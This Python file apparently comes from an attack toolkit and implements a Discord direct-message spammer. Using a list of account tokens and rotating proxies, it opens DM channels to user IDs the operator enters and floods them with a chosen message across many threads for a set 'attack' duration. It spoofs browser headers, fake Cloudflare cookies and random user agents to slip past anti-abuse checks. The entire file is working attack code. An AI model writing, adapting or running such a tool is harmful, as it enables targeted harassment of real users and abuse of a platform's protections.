import os
import time
import fade
import ctypes
import random
import asyncio
import aiohttp
import socket
import base64
import urllib3
from datetime import datetime
from sys import platform
import httpagentparser
from threading import Thread, Lock
import cloudscraper
from fake_useragent import UserAgent
from ua_parser import user_agent_parser
from colorama import Fore, Style, Back, init
from core.etc.functions import logo_discord, get_lang, get_proxies, randstr, get_discord_tokens

urllib3.disable_warnings()
init()


class DiscordSpam:
    def __init__(self):
        self.r = '0'
        self.r2 = '0'
        self.todo = 0
        self.started = 0
        self.lock = Lock()
        self.lang = get_lang()
        self.proxies = get_proxies()
        self.tokens = get_discord_tokens()
        self.ua = UserAgent()

    def stat(self):
        if platform == 'win32':
            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 ・ Successs: {self.r}")

        if self.started == self.todo:
            with self.lock:
                if self.lang == 'ru':
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'СТАТУС' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'ОТПРАВЛЕНО: ' + Fore.MAGENTA + self.r + Fore.RED + ' ОШИБКИ: ' + self.r2)
                else:
                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'STATUS' + Fore.WHITE + '] ' +
                          Fore.GREEN + 'SENT: ' + Fore.MAGENTA + self.r + Fore.RED + ' FAILS: ' + self.r2)

    def discord_thread(self, targets, message, use_proxy, proxy):
        scraper = cloudscraper.create_scraper()
        for target in targets:
            for token in self.tokens:
                user = self.ua.random
                parsed_string = user_agent_parser.Parse(user)
                parsed_string2 = httpagentparser.detect(user)
                try:
                    osv = str(parsed_string["user_agent"]["major"])
                    bv = str(parsed_string2["browser"]["version"])
                    string = '{{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"{}","browser_version":"{}","os_version":"{}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}}'.format(
                        user, bv, osv)
                    cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"
                    st = ''

                    if use_proxy == "y" and proxy == {}:
                        prox = random.choice(self.proxies)
                        proxy_2 = {"http://" + prox, "https://" + prox}
                    elif proxy != "":
                        proxy_2 = proxy
                    else:
                        proxy_2 = {}

                    header = {
                        'authorization': token
                    }

                    payload = {
                        "recipient_id": target
                    }

                    r = scraper.post('https://discord.com/api/v9/users/@me/channels', json=payload, headers=header,
                                     proxies=proxy_2)

                    ch_id = r.json()['id']

                    header = {
                        'accept': '*/*',
                        'accept-encoding': 'gzip, deflate, br',
                        'accept-language': 'en-US,en;q=0.9',
                        'authorization': token,
                        'content-length': str(len("""{content:""}""") + len(message)),
                        'content-type': 'application/json',
                        'cookie': cookie,
                        'dnt': '1',
                        'origin': 'https://discord.com',
                        'referer': f'https://discord.com/channels/@me/{ch_id}',
                        'sec-fetch-dest': 'empty',
                        'sec-fetch-mode': 'cors',
                        'sec-fetch-site': 'same-origin',
                        'user-agent': user,
                        'x-debug-options': 'bugReporterEnabled',
                        'x-discord-locale': 'ru',
                        'x-super-properties': str(base64.b64encode(string.encode('ascii'))).replace("b'", '').replace("'", '')
                    }

                    payload = {
                        "content": message
                    }

                    r = scraper.post(f'https://discord.com/api/v8/channels/{ch_id}/messages', headers=header,
                                     json=payload, proxies=proxy_2)

                    self.r = str(int(self.r) + 1)
                    self.stat()
                except:
                    self.r2 = str(int(self.r2) + 1)
                    self.stat()

    def run_thread(self, time_a, target, message, use_proxy, proxy=""):
        t = time.monotonic()
        if use_proxy != 'y':
            proxy = {}
        while time.monotonic() - t < time_a:
            self.discord_thread(target, message, use_proxy, proxy)

    def start_discord(self):
        if platform == 'win32':
            os.system("cls")
        else:
            os.system("clear")

        logo_discord()

        if self.lang == 'ru':
            text = "\nID пользователя(ей) discord для атаки > "
            text2 = """
╔═════════════════════════════════════════╗
║Если вы собираетесь указать несоклько ID,║
║  то делайте это в следующем вормате:    ║
║             ID, ID, ID                  ║
║                                         ║
║    Формат ID: 9999999999999999999       ║
╚═════════════════════════════════════════╝
                    """
            text3 = "Сообщение для отправки > "
        else:
            text = "\nDiscord user(s) ID for the attack > "
            text2 = """
╔═══════════════════════════════════════════╗
║If you are going to enter more than one ID,║
║      do it in the following format:       ║
║              ID, ID, ID                   ║
║                                           ║
║     ID format: 9999999999999999999        ║
╚═══════════════════════════════════════════╝    
                    """
            text3 = "Message to send > "

        print(fade.water(text2))

        ids = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN)
        ids = ids.replace(' ', '')
        ids = ids.split(',')
        mes = input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN)

        if self.lang == 'ru':
            text = 'Использовать прокси? (y/n) > '
            text2 = 'Потоки > '
            text3 = 'Время атаки (в сек.) > '
            text4 = '\n!НЕ РЕКОМЕНДУЕТСЯ!'
            text5 = '\nЗапустить потоки для каждой прокси? (y/n) > '
            text6 = 'поток запущен'
        else:
            text = 'Use proxies? (y/n) > '
            text2 = 'Threads > '
            text3 = 'Time attack (in sec.) > '
            text4 = '\n!NOT RECOMMENDED!'
            text5 = '\nStart threads for every proxy? (y/n) > '
            text6 = 'thread started'

        if not self.proxies:
            use_proxy = 'n'
        else:
            use_proxy = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN).lower()

        self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text2 + Fore.GREEN))
        time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN))

        if use_proxy == 'y':
            print(Back.RED + Fore.WHITE + text4 + Fore.RESET + Style.RESET_ALL)
            proxy_threads = input(Fore.YELLOW + Style.BRIGHT + text5 + Fore.GREEN).lower()
        else:
            proxy_threads = 'n'

        th = None

        if proxy_threads == 'y':
            for proxy in self.proxies:
                for count in range(self.todo):
                    th = Thread(target=self.run_thread, args=(time_attack, ids, mes, use_proxy, proxy,))
                    th.start()
                    self.started += 1
                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                          Fore.YELLOW + Style.BRIGHT + text6)

        else:
            for count in range(self.todo):
                th = Thread(target=self.run_thread, args=(time_attack, ids, mes, use_proxy,))
                th.start()
                self.started += 1
                print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
                      Fore.YELLOW + Style.BRIGHT + text6)

        time.sleep(1)

        th.join()
